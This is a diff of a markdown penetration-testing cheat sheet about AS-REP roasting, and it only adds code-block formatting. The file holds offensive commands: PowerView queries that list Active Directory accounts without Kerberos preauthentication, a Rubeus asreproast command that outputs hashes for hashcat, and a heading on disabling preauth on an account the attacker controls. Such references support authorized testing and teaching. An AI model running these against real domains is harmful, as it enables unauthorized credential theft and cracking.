@@ -16,14 +16,14 @@
     ```
 ### Windows:
 * Powerview
-
+    ```powershell
     Get-DomainUser -UACFilter DONT_REQ_PREAUTH
     PowerView > Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
-    
+    ```
 * Rubeus:
-    
+    ```Powershell
     Rubeus.exe asreproast /format:hashcat
-    
+    ```
 ### Set DON'T_REQ-PREAUTH using Powerview
 > Useful if you have generic all over an account and don't want to reset the password   
     
